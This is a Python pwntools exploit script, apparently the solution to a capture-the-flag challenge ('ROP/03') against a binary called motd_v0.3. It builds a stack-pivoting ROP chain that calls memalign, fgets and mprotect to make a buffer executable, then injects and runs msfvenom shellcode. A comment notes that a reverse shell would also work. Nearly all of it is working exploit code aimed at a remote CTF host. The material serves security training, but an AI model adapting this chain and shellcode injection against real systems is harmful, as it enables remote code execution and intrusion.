#!/usr/bin/env python
from pwn import *
from struct import pack
def q(addr): return pack('<Q', addr)

print "=== ROP/03: Solution ===\n"
"""
Explanation:
    This is the same as challenge 2, with a major twist: There is no `system`
    gadget. The stack space only allows for 3 gadgets, which is not enough to
    achieve anything useful.

    The main idea is to pivot onto one of the MOTD buffers for the ROP chain
    and setup a shellcode. This implies several tasks:
        1. Allocate some space for the shellcode
        2. Copy shellcode to buffer
        3. Mark shellcode as executable
        4. Jump to buffer

    There are a few additional gotchas thrown in for pain:
        - mprotect only works on page-aligned memory. (so no malloc)
        - The buffer space is limited for the ROP chain so uploading of shellcode is required.

    Outline of the calls to make:
        - memalign a buffer for the shellcode
        - fgets the shellcode
        - mprotect the shellcode buffer to RWX
        - jump into the shellcode


    Looking at the manpages for memalign, mprotect and fgets, we'll need
    several registers.  Remember that the calling convention in X64 is
    arguments 1-6 in RDI, RSI, RDX, RCX, R8, R9.

        => we need gadgets to set RDI, RSI, and RDX.

    We also need `stdin` to pass to `fgets`. Unfortunately, it will not be in
    the GOT until after process load, and because of ASLR it can't be
    hardcoded.  Hunting for gadgets that could let us dereference the GOT
    address is another part of this challenge.

        => we need a dereference gadget: something like `mov rax, [rsp + 4]`

    So we identify gadgets using ROPGadget.py that will let us pop into those registers.
    the full chain is commented inline with the code below.
"""

REMOTE = False
REMOTE = ('ctf.segfault.me', 3003)
TARGET = '../bin/motd_v0.3' # Binary path (local)
DEBUG  = False              # Follow along in GDB

# msfvenom -p linux/x64/exec CMD='cat ~/flag.txt' -f c -b "\x0a\x0d"
# A reverse shell should work too.
SHELLCODE = (
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x0f\x00"
"\x00\x00\x63\x61\x74\x20\x7e\x2f\x66\x6c\x61\x67\x2e\x74\x78"
"\x74\x00\x56\x57\x48\x89\xe6\x0f\x05"
)

# ROPGadget.py --binary motd_v0.3 | less
RSP = 0x000000000040181d #: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
RBP = 0x00000000004011cd #: pop rbp ; ret
RDI = 0x0000000000401823 #: pop rdi ; ret
RSI = 0x0000000000401821 #: pop rsi ; pop r15 ; ret
RAX = 0x00000000004011ee #: xchg rax, rdi ; ret
FD  = 0x00000000004011f5 #: mov rdx, qword ptr [rbp - 4] ; ret # To get *stdin@GOT
RDX = 0x00000000004011f1 #: mov rdx, rsi ; ret
JMP = 0x000000000040115e #: jmp rax # to jump into shellcode
PAD = 0x4141414141414141 #: padding # to feed hungry pops

# Taken from the PLT since it's static with partial relro.
# r2 -qc 'pd @ section..plt' bin/motd_v0.3 | grep -E 'reloc.(memalign|mprotect|fgets)'
FGETS    = 0x00401070 # sym.imp.fgets
MEMALIGN = 0x00401090 # sym.imp.memalign
MPROTECT = 0x004010d0 # sym.imp.mprotect
STDIN    = 0x004040a0 # obj.stdin__GLIBC_2.2.5
BUFLEN   = 0x100
ALIGN    = 0x1000

ROP = [
        # PIVOT RSP
        PAD, PAD, PAD, # pop {r13, r14, r15}:

        # memalign(rdi=align, rdx=size) call
        RSI, # rsi=BUFLEN
        BUFLEN,
        PAD, # pop r15
        RDI, # rdi=ALIGN
        ALIGN,
        MEMALIGN,
        RAX, #  SWAP RDI and RAX

        # fgets(rdi=buf, rsi=BUFLEN, rdx=stdin) call
        RBP, # rdx=stdin (dereference gadget is [rbp - 4] so add 4)
        STDIN + 4,
        FD,

        RSI, # rsi=BUFLEN
        BUFLEN,
        PAD, # pop r15
        FGETS, # ret to fgets

        # mprotect(rdi=buf, rsi=0x2000, rdx=5)
        RAX, # Why did RDI change??
        RSI, # rdx=0
        0x7, # PROT_READ | PROT_EXEC | WRITE
        PAD, # pop r15
        RDX,
        RSI,
        BUFLEN,
        PAD, # pop r15
        MPROTECT, # ret to mprotect

        # Jump to shellcode
        RAX, # xchg rax, rdi (shellcode address is in rdi)
        JMP  # jmp rax
]

PAYLOAD = ''.join([ q(gadget) for gadget in ROP ])

if (len(PAYLOAD) > 0x100):
    print "PAYLOAD IS TOO LONG!!!"
    exit(0xbad)

if not DEBUG:
    p = process(TARGET) if not REMOTE else remote(*REMOTE)
else: # Follow along in GDB
    p = gdb.debug(TARGET, '''
        set follow-fork-mode parent
        set follow-exec-mode same
        b *0x401562
    ''')


# Put ROP chain in first MOTD slot.
p.sendline("2")
p.sendline("1")
p.sendline(PAYLOAD)

# Overwrite rate_motd return address to trigger ROP chain
p.sendline("3")
p.sendline("0")

p.sendline(str(RSP)) # Trigger pivot to ROP-chain
p.sendline(SHELLCODE) # Send shellcode.
print p.readall()

